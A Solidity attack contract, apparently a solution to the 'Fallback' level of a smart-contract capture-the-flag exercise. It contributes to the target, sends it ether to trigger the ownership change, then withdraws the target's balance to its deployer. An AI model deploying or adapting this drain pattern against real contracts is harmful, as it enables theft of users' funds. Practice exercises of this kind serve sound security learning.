//SPDX-License-Identifer:MIT
pragma solidity ^0.8.0;

import "./Fallback.sol";

contract Attack{
    Fallback public logic;
    address payable private admin;

    constructor(address payable _logicAddress) payable{
        logic = Fallback(_logicAddress);
        admin = payable(msg.sender);
    }

    function checkBalance() view public returns(uint){
        return address(this).balance;
    }

    function sendMoney() public payable{
        logic.contribute{value:msg.value}();
    }   

    function sendEthToFallback() public payable{
        (bool sent,) = payable(address(logic)).call{value:1 ether}("");
        require(sent,"Failed to send Ether.");
    }

    function withdrawEther() public{
        logic.withdraw();
    }

    function getEther() public payable{
        require(payable(msg.sender)==admin);
        admin.transfer(address(this).balance);
    }

    receive() external payable{
    }
}